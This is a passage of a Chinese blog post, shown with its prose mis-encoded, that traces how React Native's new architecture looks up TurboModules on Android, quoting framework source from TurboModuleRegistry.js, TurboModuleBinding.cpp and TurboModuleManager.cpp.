<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Spec</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">TurboModule</span> {
  <span class="hljs-title function_">setItem</span>(<span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span>, <span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">void</span>;
  <span class="hljs-title function_">getItem</span>(<span class="hljs-attr">key</span>: <span class="hljs-built_in">string</span>): <span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span>;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">TurboModuleRegistry</span>.<span class="hljs-property">getEnforcing</span>&lt;<span class="hljs-title class_">Spec</span>&gt;(
  <span class="hljs-string">'NativeLocalStorage'</span>,
) <span class="hljs-keyword">as</span> <span class="hljs-title class_">Spec</span>;
</code></pre>
<p>ç¬¬ä¸€æ­¥æ˜¯ç¼–å†™ä¸€ä¸ªç»§æ‰¿è‡ª<code>TurboModule</code>çš„æ¥å£ï¼Œæè¿°æˆ‘ä»¬æƒ³è¦å®šä¹‰çš„æ–¹æ³•ã€‚æœ€åæ˜¯é€šè¿‡<code>export default</code>å¯¼å‡ºäº†ä¸€ä¸ª<code>Spec</code>ç±»å‹çš„å®ç°å¯¹è±¡ã€‚å¤–éƒ¨ä½¿ç”¨æ­¤æ¨¡å—çš„ä»£ç ï¼Œåªéœ€è¦å¯¼å…¥è¿™ä¸ªå¯¹è±¡å°±å¯ä»¥ç›´æ¥è°ƒç”¨æˆ‘ä»¬æ¥å£å£°æ˜çš„è¿™äº›æ–¹æ³•ã€‚ç°åœ¨çš„å…³é”®æ˜¯åˆ†æä¸€ä¸‹<code>getEnforcing</code>æ–¹æ³•åšäº†äº›ä»€ä¹ˆã€‚</p>
<p>æŸ¥çœ‹æºç <code>react-native/packages/react-native/Libraries/TurboModule/TurboModuleRegistry.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> type {<span class="hljs-title class_">TurboModule</span>} <span class="hljs-keyword">from</span> <span class="hljs-string">'./RCTExport'</span>;
<span class="hljs-keyword">import</span> invariant <span class="hljs-keyword">from</span> <span class="hljs-string">'invariant'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title class_">NativeModules</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">'../BatchedBridge/NativeModules'</span>).<span class="hljs-property">default</span>;
<span class="hljs-keyword">const</span> turboModuleProxy = <span class="hljs-variable language_">global</span>.<span class="hljs-property">__turboModuleProxy</span>;

<span class="hljs-keyword">function</span> requireModule&lt;<span class="hljs-attr">T</span>: <span class="hljs-title class_">TurboModule</span>&gt;(<span class="hljs-attr">name</span>: string): ?T {
  <span class="hljs-keyword">if</span> (turboModuleProxy != <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">const</span> <span class="hljs-attr">module</span>: ?T = <span class="hljs-title function_">turboModuleProxy</span>(name);
    <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span> != <span class="hljs-literal">null</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">module</span>;
    }
  }

  <span class="hljs-keyword">const</span> <span class="hljs-attr">legacyModule</span>: ?T = <span class="hljs-title class_">NativeModules</span>[name];
  <span class="hljs-keyword">if</span> (legacyModule != <span class="hljs-literal">null</span>) {
    <span class="hljs-keyword">return</span> legacyModule;
  }

  <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> get&lt;<span class="hljs-attr">T</span>: <span class="hljs-title class_">TurboModule</span>&gt;(<span class="hljs-attr">name</span>: string): ?T {
  <span class="hljs-keyword">return</span> requireModule&lt;T&gt;(name);
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> getEnforcing&lt;<span class="hljs-attr">T</span>: <span class="hljs-title class_">TurboModule</span>&gt;(<span class="hljs-attr">name</span>: string): T {
  <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = requireModule&lt;T&gt;(name);
  <span class="hljs-title function_">invariant</span>(
    <span class="hljs-variable language_">module</span> != <span class="hljs-literal">null</span>,
    <span class="hljs-string">`TurboModuleRegistry.getEnforcing(...): '<span class="hljs-subst">${name}</span>' could not be found. `</span> +
      <span class="hljs-string">'Verify that a module by this name is registered in the native binary.'</span>,
  );
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">module</span>;
}
</code></pre>
<p><code>getEnforcing</code>æ–¹æ³•å®é™…ä¸Šæ˜¯è°ƒç”¨çš„<code>requireModule</code>æ¥æŸ¥æ‰¾æ¨¡å—ï¼Œ<code>requireModule</code>æ–¹æ³•å®ç°éœ€è¦æ³¨æ„ï¼Œå…¶ä¸­<code>turboModuleProxy</code>æ˜¯æ—§æ¶æ„çš„æœºåˆ¶ã€‚è¿™ç‚¹æˆ‘ä»¬åœ¨å‰é¢<code>TurboModuleBinding::install</code>æ–¹æ³•åˆ†ææ—¶å°±çŸ¥é“äº†ã€‚ä½†æ­¤å¤„çš„å®ç°ä»£ç ä»ç„¶å…·æœ‰è¯¯å¯¼æ€§ï¼Œæ—¢ç„¶<code>turboModuleProxy</code>åœ¨æ–°æ¶æ„ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆå°±åº”è¯¥æ‰§è¡Œ<code>const legacyModule: ?T = NativeModules[name]</code>è¿™è¡Œæ¥æŸ¥æ‰¾æ¨¡å—ï¼Œä½†å…¶å˜é‡å‘½åçœ‹ï¼Œæ˜¯åŠ è½½æ—§æ¶æ„æ¨¡å—ã€‚å®é™…ä¸Šæ­¤å¤„æ˜¯å…¼å®¹ä»£ç ï¼ŒåŒæ—¶å…¼å®¹æ–°æ—§æ¶æ„ã€‚æƒ³è¦æ´æ‚‰å…¶ä¸­ç„æœºï¼Œæˆ‘ä»¬éœ€è¦é˜…è¯»<code>react-native/packages/react-native/Libraries/BatchedBridge/NativeModules.js</code>çš„å®ç°æºç ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">let</span> <span class="hljs-title class_">NativeModules</span>: {[<span class="hljs-attr">moduleName</span>: string]: any, ...} = {};
<span class="hljs-keyword">if</span> (<span class="hljs-variable language_">global</span>.<span class="hljs-property">nativeModuleProxy</span>) {
  <span class="hljs-title class_">NativeModules</span> = <span class="hljs-variable language_">global</span>.<span class="hljs-property">nativeModuleProxy</span>;
} <span class="hljs-keyword">else</span> {
  <span class="hljs-comment">// æ—§æ¶æ„ä»£ç çœç•¥......</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">NativeModules</span>;
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œ<code>NativeModules</code>å˜é‡çš„å£°æ˜ç›¸å½“äºä¸€ä¸ªä¸‰ç›®è¡¨è¾¾å¼ï¼Œå½“<code>global.nativeModuleProxy</code>å±æ€§å­˜åœ¨æ—¶ï¼Œç›´æ¥è¿”å›<code>nativeModuleProxy</code>å¯¹è±¡ï¼Œå¦åˆ™åŠ è½½æ—§æ¶æ„çš„æ¨¡å—ã€‚</p>
<p>åˆ°æ­¤å°±è±ç„¶å¼€æœ—äº†ï¼Œ<code>TurboModuleRegistry.getEnforcing&lt;Spec&gt;( 'NativeLocalStorage')</code>è°ƒç”¨å®é™…ä¸Šå°±ç­‰ä»·äº<code>global.nativeModuleProxy['NativeLocalStorage']</code></p>
<p>æˆ‘ä»¬å·²ç»çŸ¥é“<code>nativeModuleProxy</code>å®é™…ä¸Šå°±æ˜¯C++ç±»<code>BridgelessNativeModuleProxy</code>çš„å®ä¾‹ï¼Œå…¶ä¹Ÿå®šä¹‰åœ¨<code>TurboModuleBinding.cpp</code>ä¸­ï¼š</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-comment">// TurboModuleBinding.cpp</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">BridgelessNativeModuleProxy</span> : <span class="hljs-keyword">public</span> jsi::HostObject {
  TurboModuleBinding turboBinding_;
  std::unique_ptr&lt;TurboModuleBinding&gt; legacyBinding_;

 <span class="hljs-keyword">public</span>:
  <span class="hljs-built_in">BridgelessNativeModuleProxy</span>(
      jsi::Runtime&amp; runtime,
      TurboModuleProviderFunctionType&amp;&amp; moduleProvider,
      TurboModuleProviderFunctionType&amp;&amp; legacyModuleProvider,
      std::shared_ptr&lt;LongLivedObjectCollection&gt; longLivedObjectCollection)
      : <span class="hljs-built_in">turboBinding_</span>(
            runtime,
            std::<span class="hljs-built_in">move</span>(moduleProvider),
            longLivedObjectCollection),
        <span class="hljs-built_in">legacyBinding_</span>(
            legacyModuleProvider ? std::<span class="hljs-built_in">make_unique</span>&lt;TurboModuleBinding&gt;(
                                       runtime,
                                       std::<span class="hljs-built_in">move</span>(legacyModuleProvider),
                                       longLivedObjectCollection)
                                 : <span class="hljs-literal">nullptr</span>) {}

  <span class="hljs-function">jsi::Value <span class="hljs-title">get</span><span class="hljs-params">(jsi::Runtime&amp; runtime, <span class="hljs-type">const</span> jsi::PropNameID&amp; name)</span> <span class="hljs-keyword">override</span> </span>{
    <span class="hljs-comment">/**
     * BatchedBridge/NativeModules.js åŒ…å«è¿™ä¸€è¡Œï¼š
     *
     * module.exports = global.nativeModuleProxy
     *
     * è¿™æ„å‘³ç€ NativeModuleProxy ä½œä¸ºæ¨¡å—ä» 'NativeModules.js' å¯¼å‡ºã€‚
     * æ¯å½“æŸäº› JavaScript éœ€è¦ 'NativeModule.js' æ—¶ï¼Œ
     * Metro æ£€æŸ¥æ­¤æ¨¡å—çš„ __esModule å±æ€§ä»¥æŸ¥çœ‹æ¨¡å—æ˜¯å¦ä¸º ES6 æ¨¡å—ã€‚
     *
     * æˆ‘ä»¬ä»æ­¤å±æ€§è®¿é—®è¿”å› falseï¼Œè¿™æ ·æˆ‘ä»¬å¯ä»¥åœ¨ç¨åå‘ç”Ÿçš„å®é™… 
     * NativeModule require ä¸Šå¤±è´¥ï¼Œè¿™æ›´å…·å¯æ“ä½œæ€§ã€‚
     */</span>
    std::string moduleName = name.<span class="hljs-built_in">utf8</span>(runtime);
    <span class="hljs-keyword">if</span> (moduleName == <span class="hljs-string">"__esModule"</span>) {
      <span class="hljs-keyword">return</span> {<span class="hljs-literal">false</span>}; <span class="hljs-comment">// è¡¨ç¤ºä¸æ˜¯ ES6 æ¨¡å—</span>
    }

    <span class="hljs-comment">// ä¼˜å…ˆå°è¯•ä» TurboModule ç³»ç»Ÿè·å–æ¨¡å—</span>
    <span class="hljs-keyword">auto</span> turboModule = turboBinding_.<span class="hljs-built_in">getModule</span>(runtime, moduleName);
    <span class="hljs-keyword">if</span> (turboModule.<span class="hljs-built_in">isObject</span>()) {
      <span class="hljs-keyword">return</span> turboModule;
    }

    <span class="hljs-comment">// å›é€€åˆ° Legacy Module ç³»ç»Ÿï¼ˆå…¼å®¹æ—§æ¶æ„ï¼‰</span>
    <span class="hljs-keyword">if</span> (legacyBinding_) {
      <span class="hljs-keyword">auto</span> legacyModule = legacyBinding_-&gt;<span class="hljs-built_in">getModule</span>(runtime, moduleName);
      <span class="hljs-keyword">if</span> (legacyModule.<span class="hljs-built_in">isObject</span>()) {
        <span class="hljs-keyword">return</span> legacyModule;
      }
    }
    <span class="hljs-comment">// æ¨¡å—ä¸å­˜åœ¨ï¼Œè¿”å› null</span>
    <span class="hljs-keyword">return</span> jsi::Value::<span class="hljs-built_in">null</span>();
  }
  <span class="hljs-comment">// çœç•¥â€¦â€¦</span>
};
</code></pre>
<p>è¿™é‡Œç»§æ‰¿è‡ªJSIæ¥å£æä¾›çš„<code>jsi::HostObject</code>ç±»å‹ï¼Œè¿™è¡¨ç¤ºæ­¤C++ç±»æ˜¯å¯ä»¥ç›´æ¥è¢«ä¸Šå±‚JSä»£ç ä½¿ç”¨çš„å¯¹è±¡ç±»å‹ã€‚æ ¹æ®JSIçš„è¦æ±‚ï¼Œå¦‚æœä¸€ä¸ªC++ç±»å¸Œæœ›è¢«JSç›´æ¥è°ƒç”¨ï¼Œé‚£ä¹ˆå°±è¦ç»§æ‰¿<code>jsi::HostObject</code>ã€‚</p>
<p>æ­¤ç±»é¦–å…ˆåˆ›å»ºäº†ä¸€ä¸ª<code>TurboModuleBinding</code>å¯¹è±¡ï¼Œå½“ä¸Šå±‚è°ƒç”¨<code>global.nativeModuleProxy['NativeLocalStorage']</code>æ—¶ï¼Œå°±ä¼šè°ƒç”¨å…¶<code>get</code>æ–¹æ³•ï¼Œä½œä¸ºæ–°æ¶æ„ï¼Œæ¥ä¸‹æ¥å°±ä¼šè°ƒç”¨<code>TurboModuleBinding</code>çš„<code>getModule</code>æ¥æŸ¥æ‰¾æ¨¡å—ã€‚</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-comment">// TurboModuleBinding.cpp</span>
<span class="hljs-function">jsi::Value <span class="hljs-title">TurboModuleBinding::getModule</span><span class="hljs-params">(
    jsi::Runtime&amp; runtime,
    <span class="hljs-type">const</span> std::string&amp; moduleName)</span> <span class="hljs-type">const</span> </span>{
  std::shared_ptr&lt;TurboModule&gt; <span class="hljs-keyword">module</span>;
  {
    <span class="hljs-function">TraceSection <span class="hljs-title">s</span><span class="hljs-params">(<span class="hljs-string">"TurboModuleBinding::moduleProvider"</span>, <span class="hljs-string">"module"</span>, moduleName)</span></span>;
    <span class="hljs-keyword">module</span> = <span class="hljs-built_in">moduleProvider_</span>(moduleName);  <span class="hljs-comment">// â† è°ƒç”¨moduleProviderè·å–æ¨¡å—</span>
  }
  <span class="hljs-keyword">if</span> (<span class="hljs-keyword">module</span>) {
    TurboModuleWithJSIBindings::<span class="hljs-built_in">installJSIBindings</span>(<span class="hljs-keyword">module</span>, runtime);

    <span class="hljs-comment">// jsRepresentation æ˜¯ä»€ä¹ˆï¼ŸTurboModule å±æ€§çš„ç¼“å­˜</span>
    <span class="hljs-comment">// æ­¤åï¼Œå§‹ç»ˆå°†ç¼“å­˜ï¼ˆå³ï¼šjsRepresentationï¼‰è¿”å›ç»™ JavaScript</span>
    <span class="hljs-comment">//</span>
    <span class="hljs-comment">// å¦‚æœåœ¨ TurboModule ä¸Šæ‰¾åˆ° jsRepresentationï¼Œåˆ™è¿”å›å®ƒã€‚</span>
    <span class="hljs-comment">//</span>
    <span class="hljs-comment">// æ³¨æ„ï¼šTurboModule åœ¨ TurboModuleManager ä¸­æŒ‰åç§°ç¼“å­˜ã€‚å› æ­¤ï¼Œ</span>
    <span class="hljs-comment">// jsRepresentation ä¹Ÿç”± TurboModuleManager æŒ‰åç§°ç¼“å­˜</span>
    <span class="hljs-keyword">auto</span>&amp; weakJsRepresentation = <span class="hljs-keyword">module</span>-&gt;jsRepresentation_;
    <span class="hljs-keyword">if</span> (weakJsRepresentation) {
      <span class="hljs-keyword">auto</span> jsRepresentation = weakJsRepresentation-&gt;<span class="hljs-built_in">lock</span>(runtime);
      <span class="hljs-keyword">if</span> (!jsRepresentation.<span class="hljs-built_in">isUndefined</span>()) {
        <span class="hljs-keyword">return</span> jsRepresentation;  <span class="hljs-comment">// â† è¿”å›ç¼“å­˜çš„ JS å¯¹è±¡</span>
      }
    }

    <span class="hljs-comment">// çŠ¶æ€ï¼šåœ¨ TurboModule ä¸Šæœªæ‰¾åˆ° jsRepresentation</span>
    <span class="hljs-comment">// åˆ›å»ºä¸€ä¸ªå…¨æ–°çš„ jsRepresentationï¼Œå¹¶å°†å…¶é™„åŠ åˆ° TurboModule</span>
    <span class="hljs-function">jsi::Object <span class="hljs-title">jsRepresentation</span><span class="hljs-params">(runtime)</span></span>;
    weakJsRepresentation =
        std::<span class="hljs-built_in">make_unique</span>&lt;jsi::WeakObject&gt;(runtime, jsRepresentation);

    <span class="hljs-comment">// åœ¨å±æ€§è®¿é—®æ—¶å»¶è¿Ÿå¡«å…… jsRepresentationã€‚</span>
    <span class="hljs-comment">//</span>
    <span class="hljs-comment">// è¿™æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ</span>
    <span class="hljs-comment">//   1. æœ€åˆ jsRepresentation æ˜¯ç©ºçš„ï¼š{}</span>
    <span class="hljs-comment">//   2. å¦‚æœåœ¨ jsRepresentation ä¸Šçš„å±æ€§æŸ¥æ‰¾å¤±è´¥ï¼ŒJS è¿è¡Œæ—¶å°†</span>
    <span class="hljs-comment">//   æœç´¢ jsRepresentation çš„åŸå‹ï¼šjsi::Object(TurboModule)ã€‚</span>
    <span class="hljs-comment">//   3. TurboModule::get(runtime, propKey) æ‰§è¡Œã€‚è¿™ä¼šåˆ›å»º</span>
    <span class="hljs-comment">//   å±æ€§ï¼Œå°†å…¶ç¼“å­˜åœ¨ jsRepresentation ä¸Šï¼Œç„¶åå°†å…¶è¿”å›ç»™JavaScript</span>
    <span class="hljs-keyword">auto</span> hostObject =
        jsi::Object::<span class="hljs-built_in">createFromHostObject</span>(runtime, std::<span class="hljs-built_in">move</span>(<span class="hljs-keyword">module</span>));
    jsRepresentation.<span class="hljs-built_in">setProperty</span>(runtime, <span class="hljs-string">"__proto__"</span>, std::<span class="hljs-built_in">move</span>(hostObject));

    <span class="hljs-keyword">return</span> jsRepresentation; 
  } <span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">return</span> jsi::Value::<span class="hljs-built_in">null</span>();
  }
}
</code></pre>
<p>è¿™é‡Œ<code>moduleProvider_</code>æ­£æ˜¯æˆ‘ä»¬å‰é¢ç•¥è¿‡çš„å†…å®¹ï¼Œåœ¨<code>TurboModuleManager::createTurboModuleProvider</code>æ–¹æ³•ä¸­åˆ›å»ºçš„ä¸€ä¸ªé—­åŒ…ã€‚æ­¤æ—¶ä¼ å…¥æ¨¡å—åè°ƒç”¨æ­¤é—­åŒ…ï¼Œé—­åŒ…ä¸­ä¸»è¦è¿˜æ˜¯è°ƒç”¨<code>TurboModuleManager::getTurboModule</code>æ–¹æ³•ï¼š</p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-comment">// TurboModuleManager.cpp</span>

<span class="hljs-function">std::shared_ptr&lt;TurboModule&gt; <span class="hljs-title">TurboModuleManager::getTurboModule</span><span class="hljs-params">(
    jni::alias_ref&lt;jhybridobject&gt; javaPart,
    <span class="hljs-type">const</span> std::string&amp; name,
    jsi::Runtime&amp; runtime)</span> </span>{
  <span class="hljs-type">const</span> <span class="hljs-type">char</span>* moduleName = name.<span class="hljs-built_in">c_str</span>();
  TurboModulePerfLogger::<span class="hljs-built_in">moduleJSRequireBeginningStart</span>(moduleName);

  <span class="hljs-comment">// 1. æ£€æŸ¥ C++ ç¼“å­˜</span>
  <span class="hljs-keyword">auto</span> turboModuleLookup = turboModuleCache_.<span class="hljs-built_in">find</span>(name);
  <span class="hljs-keyword">if</span> (turboModuleLookup != turboModuleCache_.<span class="hljs-built_in">end</span>()) {
    TurboModulePerfLogger::<span class="hljs-built_in">moduleJSRequireBeginningCacheHit</span>(moduleName);
    TurboModulePerfLogger::<span class="hljs-built_in">moduleJSRequireBeginningEnd</span>(moduleName);
    <span class="hljs-keyword">return</span> turboModuleLookup-&gt;second;  <span class="hljs-comment">// â† ç¼“å­˜å‘½ä¸­ï¼Œç›´æ¥è¿”å›</span>
  }

  TurboModulePerfLogger::<span class="hljs-built_in">moduleJSRequireBeginningEnd</span>(moduleName);

  <span class="hljs-comment">// 2. å°è¯•è·å– C++ TurboModuleï¼ˆé€šè¿‡ delegateï¼‰</span>
  <span class="hljs-keyword">auto</span> cxxDelegate = delegate_-&gt;<span class="hljs-built_in">cthis</span>();
  <span class="hljs-keyword">auto</span> cxxModule = cxxDelegate-&gt;<span class="hljs-built_in">getTurboModule</span>(name, jsCallInvoker_);
  <span class="hljs-keyword">if</span> (cxxModule) {
    turboModuleCache_.<span class="hljs-built_in">insert</span>({name, cxxModule});  <span class="hljs-comment">// åŠ å…¥C++ç¼“å­˜</span>
    <span class="hljs-keyword">return</span> cxxModule;
  }

  <span class="hljs-comment">// 3. å°è¯•è·å–å…¨å±€æ³¨å†Œçš„ C++ TurboModule</span>
  <span class="hljs-keyword">auto</span>&amp; cxxTurboModuleMapProvider = <span class="hljs-built_in">globalExportedCxxTurboModuleMap</span>();
  <span class="hljs-keyword">auto</span> it = cxxTurboModuleMapProvider.<span class="hljs-built_in">find</span>(name);
  <span class="hljs-keyword">if</span> (it != cxxTurboModuleMapProvider.<span class="hljs-built_in">end</span>()) {
    <span class="hljs-keyword">auto</span> turboModule = it-&gt;<span class="hljs-built_in">second</span>(jsCallInvoker_);
    turboModuleCache_.<span class="hljs-built_in">insert</span>({name, turboModule});
    <span class="hljs-keyword">return</span> turboModule;
  }

  <span class="hljs-comment">// 4. è°ƒç”¨ Java å±‚è·å– Java TurboModule</span>
  <span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> getTurboJavaModule = javaPart-&gt;<span class="hljs-built_in">getClass</span>()
                                                                                            -&gt;getMethod&lt;jni::<span class="hljs-built_in">alias_ref</span>&lt;JTurboModule&gt;(<span class="hljs-type">const</span> std::string&amp;)&gt;(
                                                                                                                                                                              <span class="hljs-string">"getTurboJavaModule"</span>);
  <span class="hljs-keyword">auto</span> moduleInstance = <span class="hljs-built_in">getTurboJavaModule</span>(javaPart.<span class="hljs-built_in">get</span>(), name);
  <span class="hljs-keyword">if</span> (moduleInstance) {
    TurboModulePerfLogger::<span class="hljs-built_in">moduleJSRequireEndingStart</span>(moduleName);
    <span class="hljs-comment">// 5. åˆ›å»º JavaTurboModule åŒ…è£…</span>
    JavaTurboModule::InitParams params = {
        .moduleName = name,
        .instance = moduleInstance,
        .jsInvoker = jsCallInvoker_,
        .nativeMethodCallInvoker = nativeMethodCallInvoker_};

    <span class="hljs-keyword">auto</span> turboModule = cxxDelegate-&gt;<span class="hljs-built_in">getTurboModule</span>(name, params);
    <span class="hljs-comment">// 6. å¤„ç† JSI Bindingsï¼ˆå¦‚æœæœ‰ï¼‰</span>
    <span class="hljs-keyword">if</span> (moduleInstance-&gt;<span class="hljs-built_in">isInstanceOf</span>(JTurboModuleWithJSIBindings::<span class="hljs-built_in">javaClassStatic</span>())) {
      <span class="hljs-type">static</span> <span class="hljs-keyword">auto</span> getBindingsInstaller =
          JTurboModuleWithJSIBindings::<span class="hljs-built_in">javaClassStatic</span>()
              -&gt;<span class="hljs-built_in">getMethod</span>&lt;BindingsInstallerHolder::<span class="hljs-built_in">javaobject</span>()&gt;(
                  <span class="hljs-string">"getBindingsInstaller"</span>);
      <span class="hljs-keyword">auto</span> installer = <span class="hljs-built_in">getBindingsInstaller</span>(moduleInstance);
      <span class="hljs-keyword">if</span> (installer) {
        installer-&gt;<span class="hljs-built_in">cthis</span>()-&gt;<span class="hljs-built_in">installBindings</span>(runtime, jsCallInvoker_);
      }
    }

    turboModuleCache_.<span class="hljs-built_in">insert</span>({name, turboModule});
    TurboModulePerfLogger::<span class="hljs-built_in">moduleJSRequireEndingEnd</span>(moduleName);
    <span class="hljs-keyword">return</span> turboModule;
  }

  <span class="hljs-comment">// çœç•¥Legacy Module ......</span>

  <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;
}
</code></pre>
<p><strong>æŸ¥æ‰¾ä¼˜å…ˆçº§</strong>ï¼š</p>
<ol>
<li><strong>C++ ç¼“å­˜</strong>ï¼š<code>turboModuleCache_</code></li>
<li><strong>C++ TurboModule</strong>ï¼šé€šè¿‡ delegate</li>
<li><strong>å…¨å±€ C++ TurboModule</strong>ï¼š<code>globalExportedCxxTurboModuleMap()</code></li>
<li><strong>Java TurboModule</strong>ï¼šé¦–å…ˆé€šè¿‡ JNI è°ƒç”¨ <code>getTurboJavaModule()</code>ï¼Œæ¥ç€è°ƒç”¨C++å±‚çš„<code>getTurboModule</code></li>
<li><strong>Legacy C++ Module</strong>ï¼šå…¼å®¹æ—§æ¶æ„</li>
</ol>
<h4 data-id="heading-6">C++ TurboModule</h4>
<blockquote>
<p><strong>éœ€è¦æ³¨æ„ï¼ŒReact Nativeçš„TurboModuleæ˜¯åˆ†ä¸ºä¸¤ç§çš„ï¼Œä¸€ç§æ˜¯çº¯C++ TurboModuleï¼Œå¦ä¸€ç§æ˜¯åŸºäºåŸç”Ÿçš„TurboModule</strong>ã€‚åŸç”Ÿçš„TurboModuleä¸å¹³å°ç›¸å…³ï¼Œåœ¨Androidå¹³å°ä½¿ç”¨Java/Kotlin è¯­è¨€å¼€å‘ï¼Œåœ¨iOSä¸Šä¸»è¦æ˜¯ObjC/Swiftå¼€å‘ã€‚è€Œçº¯C++ TurboModule å°±æ˜¯C++å¼€å‘ï¼Œå¼€å‘ä¸€æ¬¡å°±å¯ä»¥åŒæ—¶å…¼å®¹ä¸¤å¤§å¹³å°ã€‚å› æ­¤å»ºè®®å°†ä¸€äº›é€šç”¨çš„ä»£ç å¯ä»¥ç”¨çº¯C++å¼€å‘ï¼Œå‡å°‘ä¸¤ä»½ä»£ç çš„ç»´æŠ¤æˆæœ¬ã€‚</p>
</blockquote>
<p>æ­¤å¤„é€»è¾‘å¾ˆæ¸…æ™°ï¼Œä¼˜å…ˆæŸ¥æ‰¾ç¬¬ä¸‰æ–¹æ³¨å†Œçš„çº¯C++ TurboModuleï¼Œå…¶æ¬¡æ‰¾å…¨å±€æ³¨å†Œçš„C++ TurboModuleï¼Œæœ€åæ‰¾Javaå¼€å‘çš„TurboModuleï¼ˆå®‰å“å¹³å°Kotlinæœ€ç»ˆä¹Ÿæ˜¯ç¼–è¯‘æˆJavaå­—èŠ‚ç ï¼Œç­‰ä»·äºJavaï¼‰ã€‚</p>
<p>å…ˆæ¥åˆ†æä¸€ä¸‹C++ TurboModuleçš„æŸ¥æ‰¾é€»è¾‘ï¼Œè¿™é‡Œçš„<code>cxxDelegate</code>æ˜¯<code>TurboModuleManagerDelegate</code>ç±»å‹ï¼Œå…¶å…·ä½“å®ç°ç±»æ˜¯<code>DefaultTurboModuleManagerDelegate</code>ã€‚</p>
<p>æºç <code>react-native/packages/react-native/ReactAndroid/src/main/jni/react/newarchdefaults/DefaultTurboModuleManagerDelegate.cpp</code></p>
<pre><code class="hljs language-c++" lang="c++"><span class="hljs-function">std::shared_ptr&lt;TurboModule&gt; <span class="hljs-title">DefaultTurboModuleManagerDelegate::getTurboModule</span><span class="hljs-params">(
    <span class="hljs-type">const</span> std::string&amp; name,
    <span class="hljs-type">const</span> std::shared_ptr&lt;CallInvoker&gt;&amp; jsInvoker)</span> </span>{
  <span class="hljs-comment">// 1. éå†æ‰€æœ‰æ³¨å†Œçš„ CxxReactPackage</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; cxxReactPackage : cxxReactPackages_) {
    <span class="hljs-keyword">auto</span> cppPart = cxxReactPackage-&gt;<span class="hljs-built_in">cthis</span>();
    <span class="hljs-keyword">if</span> (cppPart != <span class="hljs-literal">nullptr</span>) {
      <span class="hljs-keyword">auto</span> <span class="hljs-keyword">module</span> = cppPart-&gt;<span class="hljs-built_in">getModule</span>(name, jsInvoker);
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">module</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">module</span>;
      }
    }
  }

  <span class="hljs-comment">// 2. æŸ¥æ‰¾å…¨å±€ModuleProvider</span>
  <span class="hljs-keyword">auto</span> moduleProvider = DefaultTurboModuleManagerDelegate::cxxModuleProvider;
  <span class="hljs-keyword">if</span> (moduleProvider) {
    <span class="hljs-keyword">auto</span> <span class="hljs-keyword">module</span> = <span class="hljs-built_in">moduleProvider</span>(name, jsInvoker);
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">module</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">module</span>;
    }
  }

  <span class="hljs-comment">// 3. æŸ¥æ‰¾é»˜è®¤ç³»ç»Ÿæ¨¡å—</span>
  <span class="hljs-keyword">return</span> DefaultTurboModules::<span class="hljs-built_in">getTurboModule</span>(name, jsInvoker);
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°ä¹Ÿæ˜¯ä¸‰çº§æŸ¥æ‰¾ï¼Œé¦–å…ˆéå†<code>cxxReactPackages_</code>ï¼Œæ­¤å€¼å®é™…ä¸Šæ˜¯RNæ¡†æ¶åœ¨åˆå§‹åŒ–æ—¶ä¼ å…¥çš„ï¼Œå…·ä½“å¯ä»¥å›é¡¾ä¸€ä¸‹å®‰å“åˆå§‹åŒ–æµç¨‹åˆ†æä¸€æ–‡ï¼Œå®é™…ä¸Šåº”è¯¥æ˜¯ç©ºåˆ—è¡¨ï¼Œå› ä¸ºä¸€èˆ¬ä¹Ÿæ˜¯åœ¨åº”ç”¨çš„Applicationå¤„æ³¨å†Œï¼Œå¦‚ä¸‹<code>cxxReactPackageProviders</code>ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">getDefaultReactHost</span><span class="hljs-params">(
      context: <span class="hljs-type">Context</span>,
      packageList: <span class="hljs-type">List</span>&lt;<span class="hljs-type">ReactPackage</span>&gt;,
      jsMainModulePath: <span class="hljs-type">String</span> = <span class="hljs-string">"index"</span>,
      jsBundleAssetPath: <span class="hljs-type">String</span> = <span class="hljs-string">"index.android.bundle"</span>,
      jsBundleFilePath: <span class="hljs-type">String</span>? = <span class="hljs-literal">null</span>,
      jsRuntimeFactory: <span class="hljs-type">JSRuntimeFactory</span>? = <span class="hljs-literal">null</span>,
      useDevSupport: <span class="hljs-type">Boolean</span> = ReactBuildConfig.DEBUG,
